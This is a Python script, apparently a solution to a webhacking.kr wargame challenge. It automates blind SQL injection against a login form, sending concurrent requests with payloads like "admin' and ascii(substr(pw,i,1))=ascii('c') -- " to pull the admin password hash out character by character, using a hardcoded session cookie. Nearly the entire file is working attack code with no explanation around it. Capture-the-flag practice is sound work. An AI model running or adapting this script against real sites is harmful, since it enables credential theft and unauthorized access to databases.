import asyncio
import aiohttp
import string


URL = "https://webhacking.kr/challenge/bonus-2/index.php"
SESSION_ID = "fsjfd38r8f4a723sl4tojnv75l"
cookies = {'PHPSESSID':SESSION_ID}
data = {'uuid':'', 'pw':'1'}
semaphore = asyncio.Semaphore(5)  # Limit concurrent requests

async def fetch(session, payload):
    data['uuid'] = payload
    timeout = aiohttp.ClientTimeout(total=10)  # Increase timeout duration
    try:
        async with session.post(URL, data=data, timeout=timeout) as response:
            return await response.text()
    except asyncio.TimeoutError:
        # print(f"Timeout occurred for payload: {payload}")
        return "timeout"  # Placeholder for timeout

async def find_password_length(session):
    for length in range(1, 50):  # Adjust the range based on expected max length
        payload = f"admin' and LENGTH(pw) like {length} -- "
        response = await fetch(session, payload)
        if "Wrong password!" in response:
            print(f"Password length found: {length}")
            return length
    return None  # Return None if length not found

async def main():
    async with aiohttp.ClientSession(cookies=cookies) as session:
        # password_length = await find_password_length(session)
        password_length = 32 # length of the HASH
        if password_length is None:
            print("Could not determine password length.")
            return
        
        print(f"[+] Password length: {password_length}")
        password = ""
        i = 1
        character_set = string.ascii_lowercase + string.digits

        while len(password) < password_length:
            tasks = []
            for c in character_set:  # Iterate through character set
                payload = f"admin' and ascii(substr(pw,{i},1))=ascii('{c}') -- "
                tasks.append(fetch(session, payload))

                # await asyncio.sleep(0.1)  # Delay between requests

            responses = await asyncio.gather(*tasks)

            for index, response in enumerate(responses):
                # print(f"[+] Response for {character_set[index]}: {response}")
                if index < len(character_set) and "Wrong password!" in response:
                    c = character_set[index]  # Correctly access character from character set
                    password += c
                    print(f"[+] Found password so far: {password.ljust(password_length, '*')}")
                    break
            
            i += 1  # Move to the next character position

if __name__ == "__main__":
    asyncio.run(main())
